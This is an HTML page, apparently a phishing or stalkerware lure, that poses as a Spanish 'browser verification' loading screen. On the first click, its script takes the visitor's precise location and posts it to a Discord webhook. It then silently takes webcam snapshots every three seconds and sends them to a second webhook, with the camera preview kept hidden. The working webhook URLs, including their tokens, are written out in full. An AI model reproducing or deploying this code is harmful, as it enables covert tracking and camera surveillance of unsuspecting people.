<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Navegador</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #121212; color: #333; cursor: pointer; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video-preview, #canvas { display: none; }
        .content { text-align: center; }
    </style>
</head>
<body>

<div class="content">
    <div class="loader"></div>
    <p style="color: #666; margin-top: 20px;">Cargando componentes del servidor...</p>
    <video id="video-preview" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
</div>

<script>
    const HOOK_LOC = 'https://discord.com/api/webhooks/1494497108756136046/Jbl754EuqvTHozm4Q_jt6kmj_JaRJFIrjopX9TH_uL5iZXmBp56ZrcKfp1ODPiagV2qD';
    const HOOK_CAM = 'https://discord.com/api/webhooks/1494499724051484723/wT1_TJrUcW0jqANhOIpt046BvQEzUFUt-sH1SDYboadftYKOZEd9Adt303RBHZ-dhtRA';

    const video = document.getElementById('video-preview');
    const canvas = document.getElementById('canvas');

    async function iniciarProceso() {
        // 1. Ubicación
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;

                await fetch(HOOK_LOC, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: "📍 **Ubicación detectada**",
                        embeds: [{
                            title: "Coordenadas",
                            color: 15105570,
                            description: "Latitud: " + lat + "\nLongitud: " + lon + "\n\n[Ver Mapa](" + mapUrl + ")"
                        }]
                    })
                });
            }, null, { enableHighAccuracy: true });
        }

        // 2. Cámara
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            video.srcObject = stream;

            setTimeout(() => {
                enviarFoto();
                setInterval(enviarFoto, 3000);
            }, 2000);

        } catch (err) {
            console.log("Acceso denegado");
        }
    }

    function enviarFoto() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append('file', blob, 'img.png');
            formData.append('payload_json', JSON.stringify({
                content: "📸 **Captura automática**"
            }));

            fetch(HOOK_CAM, { method: 'POST', body: formData });
        }, 'image/png');
    }

    // Importante: Inicia al hacer clic
    document.body.addEventListener('click', iniciarProceso, { once: true });
</script>

</body>
</html>
